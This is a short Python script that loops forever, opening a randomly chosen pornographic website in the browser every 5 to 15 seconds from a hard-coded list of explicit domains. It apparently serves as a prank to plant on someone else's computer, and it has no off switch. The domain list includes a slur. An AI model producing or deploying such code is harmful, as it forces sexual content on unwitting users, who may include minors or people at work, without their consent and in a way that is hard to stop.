import webbrowser
import time
import random

while True:
	sites = random.choice(['pornhub.com', 'xnxx.com', 'xvideos.com', 'xhamster.com', 'sex.com', 'gaymaletube.com', 'bdsmstreak.com', 'hotsouthindiansex.com', 'hentaigasm.com', 'shemalehd.sex', 'anyshemale.com', 'tranny.one',])
	visit = "http://{}".format(sites)
	webbrowser.open(visit)
	seconds = random.randrange(5, 15)
	time.sleep(seconds)
